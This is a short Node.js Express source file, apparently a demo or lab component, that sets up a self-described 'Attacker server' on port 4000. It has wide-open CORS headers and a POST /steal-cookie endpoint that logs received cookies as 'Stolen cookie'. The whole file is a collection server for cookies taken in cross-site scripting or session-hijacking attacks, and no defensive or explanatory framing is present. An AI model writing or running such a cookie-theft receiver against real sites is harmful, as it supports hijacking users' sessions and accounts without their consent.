const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');

const app = express();

app.use(bodyParser.json());
app.use(cookieParser());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

app.post('/steal-cookie', (req, res) => {
  console.log('Stolen cookie:', req.cookies); 
  res.send('Cookie received');
});

const PORT = 4000;
app.listen(PORT, () => {
  console.log(`Attacker server running on http://localhost:${PORT}`);
});